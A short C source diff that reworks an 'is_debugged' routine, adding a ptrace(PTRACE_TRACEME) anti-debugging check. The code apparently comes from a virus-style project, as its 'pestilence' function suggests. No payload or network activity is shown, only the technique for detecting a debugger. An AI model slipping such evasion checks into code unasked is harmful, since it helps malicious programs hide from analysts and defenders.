@@ -134,7 +134,8 @@ static int forbid_proc(void)
 	return 0;
 }
 
-int is_debugged(void) {
+#ifdef ENABLE_EXEC
+static int is_debugged(void) {
 
 	int res = 0;
 	int fd = open(STR("/proc/self/status"), O_RDONLY);
@@ -162,6 +163,14 @@ int is_debugged(void) {
 	close(fd);
 	return res;
 }
+#else
+static int	is_debugged(void)
+{
+	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
+		return (1);
+	return (0);
+}
+#endif
 
 int pestilence(void)
 {
@@ -197,9 +206,3 @@ int pestilence(void)
 //}
 
 
-//static int	check_ptrace(void)
-//{
-//	if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
-//		return (1);
-//	return (0);
-//}
